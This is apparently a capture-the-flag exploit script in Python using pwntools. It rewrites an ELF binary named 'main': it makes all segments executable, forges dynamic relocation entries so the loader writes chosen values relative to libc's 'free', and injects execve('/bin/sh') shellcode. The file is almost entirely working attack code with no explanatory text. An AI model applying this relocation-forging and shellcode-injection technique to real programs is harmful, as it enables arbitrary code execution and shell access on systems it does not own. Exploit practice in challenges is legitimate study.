#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from elf import *
from pwn import *
import sys
const={
    "JUMP_SLOT":7,
    "COPY":5,
    "SYM":6,
    "FAIL":0x25,
}
code=Elf("./main")
for i in range(len(code.phdrs)):
    code.phdrs[i].p_flags=0x7
code.save("./main")


def rela(r_offset,type,symbol,r_addend):
    return p64(r_offset)+p32(const[type])+p32(symbol)+p64(r_addend)
def sym(name,info,shndx,value,size):
    return p32(name)+p8(info)+p8(shndx)+p16(value)+p64(size)

pool=[]
cnt=1
base_func="free"
def write(dis,value,libc_d=True):
    global pool
    global cnt
    dis-=libc.sym[base_func]
    if libc_d:
        value-=libc.sym[base_func]
    tmp1=rela(rela_base+0x18*cnt,"JUMP_SLOT",2,0xffffffffffffffff&dis)
    tmp2=rela(0xdeadbeef,"JUMP_SLOT",2 if libc_d else 0,0xffffffffffffffff&value)
    pool.append(tmp1)
    pool.append(tmp2)
    cnt+=2

libc_ld_dis = 0x5f3000
libc=ELF("./libc.so.6")
sym_idx=5
jmp_idx=10
rela_idx=9
elf=ELF("./main")
rela_base=elf.sections[rela_idx]['sh_addr']

write(libc_ld_dis + 0x227000+ 0x2170,0x4009e0,libc_d = False)
tmp=rela(0xdeadbeef,"FAIL",0x0,0)
pool.append(tmp)

for i in range(len(pool)):
    elf.write(rela_base+0x18*i,pool[i])

shellcode="""
    mov rax,SYS_execve
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    syscall
"""
shellcode=asm(shellcode,arch="amd64")
elf.write(0x4009e0,shellcode)
#elf.write(next(elf.search("/lib64/ld-linux-x86-64.so.2")),".//////ld-linux-x86-64.so.2")
elf.save()

